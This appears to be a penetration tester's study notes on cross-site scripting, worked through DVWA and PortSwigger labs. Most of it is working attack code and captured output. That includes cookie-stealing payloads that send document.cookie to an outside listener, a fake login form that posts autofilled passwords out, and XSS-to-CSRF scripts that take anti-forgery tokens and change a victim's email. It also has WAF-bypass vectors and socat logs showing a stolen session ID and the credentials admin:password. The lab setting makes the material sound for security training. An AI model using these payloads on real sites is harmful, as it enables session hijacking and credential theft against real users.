# BeEF XSS Good modules
1. Network -> Ping Sweep
2. Network -> Port Scanner
3. Social Engineering -> Pretty Theft

# notes:
- It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other
- Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers:
   1. Secure
   2. HttpOnly
- The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.
   This protects the cookie from being sent in cleartext and captured over the network.
- The HttpOnly flag instructs the browser to deny JavaScript access to the cookie.
   If this flag is not set,
      we can use an XSS payload to steal the cookie.
---

## impact
1. cookie theft

---

# common JS
## onload event
```html
<body onload='alert("Welcome to my website")'>
```
## on mouse over
```html
<a onmouseover='alert("50% discount")'>surprise</a>
```
## other event handlers
| Event Handler | Description |
| --- | --- |
| onclick | Use this to invoke JavaScript upon clicking (a link, or form boxes) |
| onload | Use this to invoke JavaScript after the page or an image has finished loading |
| onmouseover | Use this to invoke JavaScript if the mouse passes by some link |
| onmouseout | Use this to invoke JavaScript if the mouse goes past some link |
| onunload | Use this to invoke JavaScript right after someone leaves this page. |

---

# XSS: security: low
```php
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```
## sample request
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: meta
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://meta
Connection: close
Referer: http://meta/dvwa/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
Upgrade-Insecure-Requests: 1

txtName=test2&mtxMessage=test2&btnSign=Sign+Guestbook
```
## XSS Request: payload (url-encoded) in the txtMessage parameter (the txtName parameter was also vulnerable)
```html
<script>new Image().src="http://20.20.20.129/cool.jpg?output="+document.cookie;</script>
```
## Note: the comment field had a character limit where we couldn't insert the entire payload. That's why we used `burp` for that
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: meta
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://meta
Connection: close
Referer: http://meta/dvwa/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
Upgrade-Insecure-Requests: 1

txtName=test&mtxMessage=<script>new+Image().src%3d"http%3a//20.20.20.129/cool.jpg%3foutput%3d"%2bdocument.cookie%3b</script>&btnSign=Sign+Guestbook
```
## When the page is visited, we get back the cookies on our socat listener:
```bash
socat -d -d TCP4-LISTEN:80,reuseaddr,fork STDOUT
```
```
2022/07/27 14:08:53 socat[213159] N listening on AF=2 0.0.0.0:80
2022/07/27 14:09:00 socat[213159] N accepting connection from AF=2 20.20.20.129:50996 on AF=2 20.20.20.129:80
2022/07/27 14:09:00 socat[213159] N forked off child process 213203
2022/07/27 14:09:00 socat[213159] N listening on AF=2 0.0.0.0:80
2022/07/27 14:09:00 socat[213203] N using stdout for reading and writing
2022/07/27 14:09:00 socat[213203] N starting data transfer loop with FDs [6,6] and [1,1]
GET /cool.jpg?output=security=low;%20PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5 HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://meta/
```
## another payload to steal cookies (from portswigger labs) using POST
```html
<script>fetch('http://20.20.20.129', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```
### output: Much cleaner :D
```
2022/07/27 15:47:54 socat[249716] N listening on AF=2 0.0.0.0:80
2022/07/27 15:48:35 socat[249716] N accepting connection from AF=2 20.20.20.129:53706 on AF=2 20.20.20.129:80
2022/07/27 15:48:35 socat[249716] N forked off child process 249964
2022/07/27 15:48:35 socat[249716] N listening on AF=2 0.0.0.0:80
2022/07/27 15:48:35 socat[249964] N using stdout for reading and writing
2022/07/27 15:48:35 socat[249964] N starting data transfer loop with FDs [6,6] and [1,1]
POST / HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://meta/
Content-Type: text/plain;charset=UTF-8
Origin: http://meta
Content-Length: 56
Connection: close

security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
```

---

## XSS to steal username/password
### payload:
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
```
anyone who views the comments will see a login form. if his browser autofills the username and password fields, they would be posted to the url included in the payload
### output:
```
2022/07/27 15:58:01 socat[253401] N listening on AF=2 0.0.0.0:80
2022/07/27 15:58:11 socat[253401] N accepting connection from AF=2 20.20.20.129:46510 on AF=2 20.20.20.129:80
2022/07/27 15:58:11 socat[253401] N forked off child process 253456
2022/07/27 15:58:11 socat[253401] N listening on AF=2 0.0.0.0:80
2022/07/27 15:58:11 socat[253456] N using stdout for reading and writing
2022/07/27 15:58:11 socat[253456] N starting data transfer loop with FDs [6,6] and [1,1]
POST / HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://meta/
Content-Type: text/plain;charset=UTF-8
Origin: http://meta
Content-Length: 14
Connection: close

admin:password
```

---

## Example: stored XSS to CSRF
### Note: AJAX is used to send a request to the `my-account` page because it's where the `csrf` hidden input is present
### After that, the `csrf` token is sent in the POST request to the `/my-account/change-email` page where it changes the email the value we mentioned `test@test.com`
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## PortSwigger XSS Exploitation challenges: stealing cookies using CSRF (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
```html
<script>
var req = new XMLHttpRequest();
req.open('get','/post?postId=10',false);
req.send();
var token = req.responseText.match(/name="csrf" value="(\w+)"/)[1];
fetch('post/comment', {
method: 'POST',
mode: 'no-cors',
dest: 'document',
headers: {
  "Content-Type" : "application/x-www-form-urlencoded",
},
body: "csrf=" + token + "&postId=10&comment=mycookie:"+ document.cookie + "&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com"
});
</script>
```

## PortSwigger XSS Exploitation challenges: stealing credentials using CSRF (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
```html
<input name=username id=username>
<input type=password name=password onchange="var token = document.getElementsByName('csrf')[0].value;fetch('post/comment', {method: 'POST',mode: 'no-cors',headers: {'Content-Type' : 'application/x-www-form-urlencoded',},body: 'csrf=' + token + '&postId=2&comment='+ username.value + ':' + this.value + '&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com'});">
```

## PortSwigger XSS Exploitation challenges: performing CSRF to change user email (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET','post?postId=8',false);
xhr.send();
var token = xhr.responseText.match("csrf\" value=\"(.*)\"")[1];
var xhr2 = new XMLHttpRequest();
xhr.open('POST', 'my-account/change-email', false);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("email=wiener2%40normal-user.net&csrf=" + token);
</script>
```

---

## Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
## Solution (didn't work all the way because triggerring windows resize event could be done through JS) however the process is good for finding bypassing WAF
1. try XSS standard vector
```html
<img src=1 onerror=print()>
```
2. intercept the request with burp and send to `intruder`
3. add a payload sign between emtpy tags `<§§>`
4. copy all the tags from the XSS cheatsheet (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
5. brute force and notice the 200 OK generated with the `body` tag
6. set up the next attack in intruder using `<body%20§§=1>`
7. copy all the events from the XSS cheatsheet and start the bruteforce
8. you find that the `onresize` event gave a 200 OK
9. this means that we need to get a POC working with **that tag** as well as **that event**

### Exploitation URL
```
https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'
```

---

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

### Exploitation URL:
```
https://your-lab-id.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'
```

- This injection creates a `custom tag` with the `ID` x, 
- which contains an `onfocus` event handler that triggers the alert function.
- The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called

this custom tag will execute if the tag button is pressed or if you switch context to the browser

```html
<xss id=x onfocus=alert(1) tabindex=1>
```
---

## Lab: Reflected XSS with some SVG markup allowed (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
### Solution html code
```html
<svg><image><animateTransform onbegin=alert(1) /></image></svg>
```
### Process: we followed the same process in (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked) to search for allowed tags and events
### Step #1: we found 4 tags allowed
1. animatetransform
2. image
3. svg
4. title
### Step #2: we found 1 event allowed
1. onbegin
### Step #3: when consulting the below documentation for both the `animatetransform` tag and the `onbegin` event:
- https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animateTransform
- https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event

### We found that we can creat the svg.image.animatetransform structure to trigger javascript execution
```html
<svg><image><animateTransform onbegin=alert(1) /></image></svg>
```